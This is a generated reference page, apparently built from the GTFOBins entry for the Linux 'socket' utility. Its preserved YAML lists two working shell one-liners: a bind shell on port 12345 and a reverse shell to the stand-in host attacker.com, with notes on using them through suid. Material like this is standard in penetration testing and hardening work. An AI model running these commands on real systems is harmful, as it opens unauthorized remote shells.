---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# socket

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `socket` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socket` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [socket](../../tools/linux/socket.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | socket |
| name | socket |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/socket/ |

## Preserved Source Material

```yaml
_body: ''
_name: socket
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socket
functions:
  bind-shell:
  - code: socket -svp '/bin/sh -i' 12345
    connector: tcp-client
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  reverse-shell:
  - code: socket -qvp '/bin/sh -i' attacker.com 12345
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    listener: tcp-server
```
